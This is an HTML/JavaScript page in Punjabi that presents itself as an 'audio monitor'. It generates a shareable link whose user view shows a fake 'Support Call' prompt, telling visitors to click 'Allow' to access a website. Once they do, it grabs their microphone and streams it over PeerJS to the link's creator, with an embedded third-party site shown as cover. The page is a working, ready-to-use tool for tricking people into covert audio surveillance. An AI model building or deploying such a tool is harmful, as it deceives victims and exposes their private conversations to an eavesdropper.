<!DOCTYPE html>
<html lang="pa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ਪੱਕਾ ਆਡੀਓ ਮਾਨੀਟਰ - GitHub ਸਪੈਸ਼ਲ</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Gurmukhi:wght@400;700&display=swap');
        body { font-family: 'Noto Sans Gurmukhi', sans-serif; }
    </style>
</head>
<body class="bg-slate-100">

    <!-- ADMIN PANEL -->
    <div id="admin-view" class="max-w-3xl mx-auto p-6 mt-10">
        <div class="bg-white rounded-3xl shadow-xl p-8 border border-slate-200">
            <h1 class="text-3xl font-bold text-blue-700 text-center mb-6">Audio Admin Panel</h1>
            
            <div class="space-y-6">
                <!-- Set Fixed ID -->
                <div class="bg-blue-50 p-5 rounded-2xl border border-blue-100">
                    <label class="block text-sm font-bold text-blue-600 mb-2">ਆਪਣੀ ਪੱਕੀ ID ਸੈੱਟ ਕਰੋ (ਕੋਈ ਵੀ ਨਾਮ):</label>
                    <div class="flex gap-2">
                        <input type="text" id="custom-admin-id" value="my-room-1" 
                            class="flex-1 p-3 rounded-xl border-none outline-none focus:ring-2 focus:ring-blue-500 shadow-inner">
                        <button onclick="startAdmin()" id="start-btn" class="bg-blue-600 text-white px-6 py-3 rounded-xl font-bold">ਚਾਲੂ ਕਰੋ</button>
                    </div>
                    <p id="status" class="text-[10px] mt-2 font-bold text-slate-400 uppercase tracking-widest">ਸਥਿਤੀ: ਬੰਦ</p>
                </div>

                <!-- Generate Link -->
                <div id="link-section" class="hidden animate-fade-in">
                    <label class="block text-sm font-bold text-slate-600 mb-2">ਯੂਜ਼ਰ ਲਈ ਲਿੰਕ:</label>
                    <div class="p-4 bg-slate-50 rounded-xl border border-dashed border-slate-300 break-all text-blue-600 text-sm font-mono" id="shareable-link">
                        ---
                    </div>
                    <button onclick="copyLink()" class="mt-3 w-full bg-slate-800 text-white py-3 rounded-xl font-bold hover:bg-black transition">ਲਿੰਕ ਕਾਪੀ ਕਰੋ</button>
                    <p class="text-[10px] text-slate-400 mt-2 italic text-center">ਇਹ ਲਿੰਕ ਇੱਕ ਵਾਰ ਬਣਾ ਕੇ ਕਿਸੇ ਨੂੰ ਵੀ ਭੇਜ ਦਿਓ, ਇਹ ਹਮੇਸ਼ਾ ਕੰਮ ਕਰੇਗਾ।</p>
                </div>

                <!-- Active Users -->
                <div class="mt-10">
                    <h2 class="font-bold text-slate-800 mb-4 flex items-center gap-2">
                        <span class="w-2 h-2 bg-green-500 rounded-full"></span> ਕਨੈਕਟਡ ਯੂਜ਼ਰਸ
                    </h2>
                    <div id="users-list" class="space-y-3">
                        <p class="text-slate-400 text-sm italic">ਕੋਈ ਵੀ ਕਨੈਕਟ ਨਹੀਂ ਹੈ...</p>
                    </div>
                </div>
            </div>
        </div>
        <audio id="audio-output" autoplay></audio>
    </div>

    <!-- USER VIEW -->
    <div id="user-view" class="hidden h-screen w-full bg-slate-900 overflow-hidden relative">
        <div id="user-modal" class="absolute inset-0 z-50 flex items-center justify-center p-5 bg-slate-900/90 backdrop-blur-md">
            <div class="bg-white p-10 rounded-[2.5rem] shadow-2xl max-w-sm w-full text-center">
                <div class="text-6xl mb-6">🎙️</div>
                <h2 class="text-2xl font-bold text-slate-800 mb-2">ਸਪੋਰਟ ਕਾਲ</h2>
                <p class="text-slate-500 mb-8 text-sm">ਵੈੱਬਸਾਈਟ ਐਕਸੈਸ ਕਰਨ ਲਈ 'Allow' 'ਤੇ ਕਲਿੱਕ ਕਰੋ।</p>
                <button onclick="connectMic()" class="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl shadow-xl active:scale-95 transition-all">
                    Allow & Connect
                </button>
            </div>
        </div>
        <iframe id="target-frame" src="" class="w-full h-full border-none"></iframe>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const mode = params.get('mode');
        const aid = params.get('aid');
        const site = params.get('site');

        let peer = null;

        if (mode === 'user' && aid) {
            document.getElementById('admin-view').style.display = 'none';
            document.getElementById('user-view').style.display = 'block';
            document.getElementById('target-frame').src = site ? decodeURIComponent(site) : "https://www.gurjeet-bhullar.page4.me";
            
            peer = new Peer();
            peer.on('open', (id) => {
                const conn = peer.connect(aid);
                conn.on('open', () => conn.send({ type: 'hi', id: id }));
            });
        }

        async function connectMic() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                peer.call(aid, stream);
                document.getElementById('user-modal').style.display = 'none';
            } catch (err) {
                alert("Permission Denied!");
            }
        }

        // --- Admin Functions ---
        function startAdmin() {
            const customId = document.getElementById('custom-admin-id').value.trim();
            if(!customId) return alert("ID ਭਰੋ!");

            peer = new Peer(customId);
            peer.on('open', (id) => {
                document.getElementById('status').innerText = "ਆਨਲਾਈਨ: " + id;
                document.getElementById('status').classList.replace('text-slate-400', 'text-green-600');
                document.getElementById('link-section').classList.remove('hidden');
                document.getElementById('start-btn').disabled = true;
                document.getElementById('start-btn').classList.add('opacity-50');

                // ਲਿੰਕ ਸੈੱਟ ਕਰੋ
                const base = window.location.href.split('?')[0];
                const final = `${base}?mode=user&aid=${id}&site=${encodeURIComponent("https://www.gurjeet-bhullar.page4.me")}`;
                document.getElementById('shareable-link').innerText = final;
            });

            peer.on('connection', (conn) => {
                conn.on('data', (data) => {
                    if(data.type === 'hi') {
                        const list = document.getElementById('users-list');
                        if(list.querySelector('p')) list.innerHTML = '';
                        const d = document.createElement('div');
                        d.className = "p-3 bg-blue-50 border border-blue-100 rounded-xl text-sm font-bold flex justify-between";
                        d.innerHTML = `<span>User: ${data.id}</span> <span class="text-green-600">LIVE</span>`;
                        list.appendChild(d);
                    }
                });
            });

            peer.on('call', (call) => {
                call.answer();
                call.on('stream', (stream) => {
                    const audio = document.getElementById('audio-output');
                    audio.srcObject = stream;
                    audio.play();
                });
            });

            peer.on('error', (err) => {
                if(err.type === 'unavailable-id') alert("ਇਹ ID ਪਹਿਲਾਂ ਹੀ ਵਰਤੀ ਜਾ ਰਹੀ ਹੈ, ਕੋਈ ਹੋਰ ਨਾਮ ਰੱਖੋ।");
                else alert("ਗਲਤੀ: " + err.type);
                location.reload();
            });
        }

        function copyLink() {
            const text = document.getElementById('shareable-link').innerText;
            navigator.clipboard.writeText(text).then(() => alert('ਲਿੰਕ ਕਾਪੀ ਹੋ ਗਿਆ!'));
        }
    </script>
</body>
</html>
